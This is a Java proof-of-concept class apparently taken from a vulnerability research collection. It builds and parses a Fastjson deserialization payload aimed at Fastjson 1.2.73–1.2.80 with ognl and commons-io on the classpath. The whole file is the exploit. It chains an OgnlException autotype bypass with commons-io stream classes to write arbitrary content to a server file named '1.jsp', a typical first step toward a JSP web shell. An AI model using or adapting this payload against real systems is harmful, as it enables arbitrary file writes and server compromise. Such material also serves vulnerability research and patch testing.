package com.shiro.vuln.fastjson;

import com.alibaba.fastjson.JSON;


public class Fastjson25_ognl_io_write_2 {
    public static void main(String[] args) throws Exception {
        //依赖1.2.73-1.2.80 ognl-3.2.21  commons-io-2.7/2.8
    	String code = "test";
        for (int i = 0; i < 8200; i++) {
			code += "a";
		}
        String poc1 = "    \r\n"
        		+ "    {\r\n"
        		+ "	\"su14\": {\r\n"
        		+ "		\"@type\": \"java.lang.Exception\",\r\n"
        		+ "		\"@type\": \"ognl.OgnlException\"\r\n"
        		+ "	},\r\n"
        		+ "	\"su15\": {\r\n"
        		+ "		\"@type\": \"java.lang.Class\",\r\n"
        		+ "		\"val\": {\r\n"
        		+ "			\"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
        		+ "			{\r\n"
        		+ "				\"@type\": \"java.lang.String\"\r\n"
        		+ "				\"@type\": \"ognl.OgnlException\",\r\n"
        		+ "				\"_evaluation\": \"\"\r\n"
        		+ "			}\r\n"
        		+ "		},\r\n"
        		+ "		\"su16\": {\r\n"
        		+ "			\"@type\": \"ognl.Evaluation\",\r\n"
        		+ "			\"node\": {\r\n"
        		+ "				\"@type\": \"ognl.ASTMethod\",\r\n"
        		+ "				\"p\": {\r\n"
        		+ "					\"@type\": \"ognl.OgnlParser\",\r\n"
        		+ "					\"stream\": {\r\n"
        		+ "						\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
        		+ "						\"delegate\": {\r\n"
        		+ "							\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
        		+ "							\"reader\": {\r\n"
        		+ "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\r\n"
        		+ "      \"inputStream\":{\r\n"
        		+ "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"
        		+ "        \"input\":{\r\n"
        		+ "      \"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\r\n"
        		+ "      \"reader\":{\r\n"
        		+ "        \"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\r\n"
        		+ "        \"charSequence\":{\"@type\":\"java.lang.String\"\""+code+"\",\r\n"
        		+ "        \"start\":0,\r\n"
        		+ "        \"end\":2147483647\r\n"
        		+ "      },\r\n"
        		+ "      \"charsetName\":\"UTF-8\",\r\n"
        		+ "      \"bufferSize\":1024\r\n"
        		+ "    },\r\n"
        		+ "            \"branch\":{\r\n"
        		+ "      \"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\r\n"
        		+ "      \"writer\":{\r\n"
        		+ "        \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\r\n"
        		+ "        \"file\":\"1.jsp\",\r\n"
        		+ "        \"charsetName\":\"UTF-8\",\r\n"
        		+ "        \"append\": false\r\n"
        		+ "      },\r\n"
        		+ "      \"charsetName\":\"UTF-8\",\r\n"
        		+ "      \"bufferSize\": 1024,\r\n"
        		+ "      \"writeImmediately\": true\r\n"
        		+ "    },\r\n"
        		+ "        \"closeBranch\": true\r\n"
        		+ "      },\r\n"
        		+ "      \"httpContentType\":\"text/xml\",\r\n"
        		+ "      \"lenient\":false,\r\n"
        		+ "      \"defaultEncoding\":\"UTF-8\"\r\n"
        		+ "    },\r\n"
        		+ "							\"charsetName\": \"UTF-8\",\r\n"
        		+ "							\"bufferSize\": 1024\r\n"
        		+ "						},\r\n"
        		+ "						\"boms\": [{\r\n"
        		+ "							\"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
        		+ "							\"charsetName\": \"UTF-8\",\r\n"
        		+ "							\"bytes\": [\r\n"
        		+ "								36,82\r\n"
        		+ "							]\r\n"
        		+ "						}]\r\n"
        		+ "					}\r\n"
        		+ "				}\r\n"
        		+ "			}\r\n"
        		+ "		},\r\n"
        		+ "		\"su17\": {\r\n"
        		+ "			\"@type\": \"ognl.Evaluation\",\r\n"
        		+ "			\"node\": {\r\n"
        		+ "				\"@type\": \"ognl.ASTMethod\",\r\n"
        		+ "				\"p\": {\r\n"
        		+ "					\"@type\": \"ognl.OgnlParser\",\r\n"
        		+ "					\"stream\": {\r\n"
        		+ "						\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
        		+ "						\"delegate\": {\r\n"
        		+ "							\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
        		+ "							\"reader\": {\r\n"
        		+ "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\r\n"
        		+ "      \"inputStream\":{\r\n"
        		+ "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"
        		+ "        \"input\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.inputStream.input\"},\r\n"
        		+ "        \"branch\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.inputStream.branch\"},\r\n"
        		+ "        \"closeBranch\": true\r\n"
        		+ "      },\r\n"
        		+ "      \"httpContentType\":\"text/xml\",\r\n"
        		+ "      \"lenient\":false,\r\n"
        		+ "      \"defaultEncoding\":\"UTF-8\"\r\n"
        		+ "    },\r\n"
        		+ "							\"charsetName\": \"UTF-8\",\r\n"
        		+ "							\"bufferSize\": 1024\r\n"
        		+ "						},\r\n"
        		+ "						\"boms\": [{\r\n"
        		+ "							\"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
        		+ "							\"charsetName\": \"UTF-8\",\r\n"
        		+ "							\"bytes\": [\r\n"
        		+ "								36,82\r\n"
        		+ "							]\r\n"
        		+ "						}]\r\n"
        		+ "					}\r\n"
        		+ "				}\r\n"
        		+ "			}\r\n"
        		+ "		},\r\n"
        		+ "		\"su18\": {\r\n"
        		+ "			\"@type\": \"ognl.Evaluation\",\r\n"
        		+ "			\"node\": {\r\n"
        		+ "				\"@type\": \"ognl.ASTMethod\",\r\n"
        		+ "				\"p\": {\r\n"
        		+ "					\"@type\": \"ognl.OgnlParser\",\r\n"
        		+ "					\"stream\": {\r\n"
        		+ "						\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
        		+ "						\"delegate\": {\r\n"
        		+ "							\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
        		+ "							\"reader\": {\r\n"
        		+ "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\r\n"
        		+ "      \"inputStream\":{\r\n"
        		+ "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"
        		+ "        \"input\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.inputStream.input\"},\r\n"
        		+ "        \"branch\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.inputStream.branch\"},\r\n"
        		+ "        \"closeBranch\": true\r\n"
        		+ "      },\r\n"
        		+ "      \"httpContentType\":\"text/xml\",\r\n"
        		+ "      \"lenient\":false,\r\n"
        		+ "      \"defaultEncoding\":\"UTF-8\"\r\n"
        		+ "    },\r\n"
        		+ "							\"charsetName\": \"UTF-8\",\r\n"
        		+ "							\"bufferSize\": 1024\r\n"
        		+ "						},\r\n"
        		+ "						\"boms\": [{\r\n"
        		+ "							\"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
        		+ "							\"charsetName\": \"UTF-8\",\r\n"
        		+ "							\"bytes\": [\r\n"
        		+ "								36,82\r\n"
        		+ "							]\r\n"
        		+ "						}]\r\n"
        		+ "					}\r\n"
        		+ "				}\r\n"
        		+ "			}\r\n"
        		+ "		},\r\n"
        		+ "		\"su19\": {\r\n"
        		+ "			\"@type\": \"ognl.Evaluation\",\r\n"
        		+ "			\"node\": {\r\n"
        		+ "				\"@type\": \"ognl.ASTMethod\",\r\n"
        		+ "				\"p\": {\r\n"
        		+ "					\"@type\": \"ognl.OgnlParser\",\r\n"
        		+ "					\"stream\": {\r\n"
        		+ "						\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
        		+ "						\"delegate\": {\r\n"
        		+ "							\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
        		+ "							\"reader\": {\r\n"
        		+ "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\r\n"
        		+ "      \"inputStream\":{\r\n"
        		+ "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"
        		+ "        \"input\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.inputStream.input\"},\r\n"
        		+ "        \"branch\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.inputStream.branch\"},\r\n"
        		+ "        \"closeBranch\": true\r\n"
        		+ "      },\r\n"
        		+ "      \"httpContentType\":\"text/xml\",\r\n"
        		+ "      \"lenient\":false,\r\n"
        		+ "      \"defaultEncoding\":\"UTF-8\"\r\n"
        		+ "    },\r\n"
        		+ "							\"charsetName\": \"UTF-8\",\r\n"
        		+ "							\"bufferSize\": 1024\r\n"
        		+ "						},\r\n"
        		+ "						\"boms\": [{\r\n"
        		+ "							\"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
        		+ "							\"charsetName\": \"UTF-8\",\r\n"
        		+ "							\"bytes\": [\r\n"
        		+ "								36,82\r\n"
        		+ "							]\r\n"
        		+ "						}]\r\n"
        		+ "					}\r\n"
        		+ "				}\r\n"
        		+ "			}\r\n"
        		+ "		}	\r\n"
        		+ "	}\r\n"
        		+ "";
        System.out.println(poc1);

        JSON.parseObject(poc1);
    }
}
